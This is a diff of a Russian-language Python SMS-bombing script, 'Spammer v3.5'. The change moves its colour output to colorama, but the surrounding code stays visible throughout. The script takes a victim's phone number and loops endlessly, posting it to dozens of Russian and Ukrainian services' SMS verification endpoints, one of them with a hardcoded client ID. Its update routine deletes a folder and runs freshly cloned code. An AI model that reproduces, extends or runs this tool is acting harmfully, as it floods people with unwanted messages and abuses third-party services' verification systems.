@@ -1,22 +1,23 @@
 #!/usr/bin/python3
-# Spammer v3.4
+# Spammer v3.5
 # Author: cludeex
 import os, random, time
 try:
     import requests
+    from colorama import Fore, Style
 except:
     im = input("Установить недостоющие библиотеки? (y/n) ")
     if im == "y":
-        os.system("python -m pip install requests; spamer")
+        os.system("python -m pip install requests colorama; spamer")
     else:
         print("Отменено")
         exit()
 def logo():
     os.system('cls' if os.name=='nt' else 'clear')
-    print(color.BOLD+color.GREEN+"  ___ ___  _   __  __ __  __ ___ ___\n / __| _ \\/_\\ |  \\/  |  \\/  | __| _ \\\n \\__ \\  _/ _ \\| |\\/| | |\\/| | _||   /\n |___/_|/_/ \\_\\_|  |_|_|  |_|___|_|_\\\n\n     Spammer: github.com/cludeex\n"+color.END)
+    print(Style.BRIGHT+Fore.GREEN+"  ___ ___  _   __  __ __  __ ___ ___\n / __| _ \\/_\\ |  \\/  |  \\/  | __| _ \\\n \\__ \\  _/ _ \\| |\\/| | |\\/| | _||   /\n |___/_|/_/ \\_\\_|  |_|_|  |_|___|_|_\\\n\n     Spammer: github.com/cludeex\n"+Style.RESET_ALL)
 def update():
     logo()
-    up = input(color.BOLD+color.BLUE+"Вы уверены, что хотите обновить? "+color.END+"(y/n) ")
+    up = input(Style.BRIGHT+Fore.BLUE+"Вы уверены, что хотите обновить? "+Style.RESET_ALL+"(y/n) ")
     if up == "y":
         os.system("rm -rf spammer && git clone https://github.com/cludeex/spammer && python ~/spammer/install.py")
     else:
@@ -28,23 +29,23 @@ def main(t):
     print("[1] СМС СПАМЕР.")
     print("[2] ОБНОВИТЬ СПАМЕР.")
     print("[3] ВЫХОД.\n")
-    input1 = input(color.BOLD+color.BLUE+"Введите номер пункта: "+color.END)
+    input1 = input(Style.BRIGHT+Fore.BLUE+"Введите номер пункта: "+Style.RESET_ALL)
     try:
         requests.get("http://google.com", verify=True)
     except:
         logo()
-        print(color.BOLD+color.RED+"[!] Нет интернет соединения.")
+        print(Style.BRIGHT+Fore.RED+"[!] Нет интернет соединения.")
         main(2)
     if input1 == "1":
         logo()
-        _phone = input(color.BOLD+color.BLUE+"Введите номер телефона: "+color.END)
+        _phone = input(Style.BRIGHT+Fore.BLUE+"Введите номер телефона: "+Style.RESET_ALL)
         if _phone == "":
            main(0)
         if len(_phone) == 11 or len(_phone) == 12 or len(_phone) == 13:
             pass
         else:
             logo()
-            print(color.BOLD+color.RED+"[!] Неправильный номер.")
+            print(Style.BRIGHT+Fore.RED+"[!] Неправильный номер.")
             main(2)
         if _phone[0] == "+":
             _phone = _phone[1:]
@@ -63,7 +64,7 @@ def main(t):
         logo()
         while True:
             if _phone[0] == "7":
-                print("Телефон: "+color.BOLD+color.BLUE+_phone+color.END+"\nСпамер запущен.\nЧтобы остановить - нажмите Ctrl + Z")
+                print("Телефон: "+Style.BRIGHT+Fore.BLUE+_phone+Style.RESET_ALL+"\nСпамер запущен.\nЧтобы остановить - нажмите Ctrl + Z")
                 try:
                     requests.post("https://moscow.rutaxi.ru/ajax_keycode.html", data={"l": _phone9}).json()["res"]
                 except:
@@ -79,7 +80,7 @@ def main(t):
                 try:
                     requests.post("https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={})
                 except:
-                     pass
+                    pass
                 try:
                     requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone})
                 except:
@@ -509,7 +510,7 @@ def main(t):
                 except:
                     pass
             if _phone[0] == "3" and _phone[1] == "8" and _phone[2] == "0":
-                print("Телефон: "+color.BOLD+color.BLUE+_phone+color.END+"\nСпамер запущен.\nЧтобы остановить - нажмите Ctrl + Z")
+                print("Телефон: "+Style.BRIGHT+Fore.BLUE+_phone+Style.RESET_ALL+"\nСпамер запущен.\nЧтобы остановить - нажмите Ctrl + Z")
                 try:
                     requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
                 except:
@@ -585,7 +586,7 @@ def main(t):
                 try:
                     requests.post('https://partner.uklon.com.ua/api/v1/registration/sendcode', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone})
                 except:
-                   pass
+                    pass
                 try:
                     requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
                 except:
@@ -659,30 +660,17 @@ def main(t):
                 except:
                     pass
             else:
-                print(color.BOLD+color.RED+"[!] Неправильный номер.")
+                print(Style.BRIGHT+Fore.RED+"[!] Неправильный номер.")
                 main(2)
     elif input1 == "2":
         update()
     elif input1 == "3":
        logo()
-       print(color.BOLD+color.BLUE+"До скорой встречи!\n"+color.END)
+       print(Style.BRIGHT+Fore.BLUE+"До скорой встречи!\n"+Style.RESET_ALL)
        exit()
     else:
        logo()
-       print(color.BOLD+color.RED+"[!] Не правильный номер пункта.")
+       print(Style.BRIGHT+Fore.RED+"[!] Не правильный номер пункта.")
        main(2)
-class color:
-    RED = '\033[91m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    BLUE = '\033[94m'
-    MAGENTA = '\033[95m'
-    CYAN = '\033[96m'
-    WHITE = '\033[97m'
-    GREY = '\033[90m'
-    BOLD = '\033[1m'
-    ITALIC = '\033[3m'
-    UNDERLINE = '\033[4m'
-    END = '\033[0m'
 if __name__ == "__main__":
     main(0)
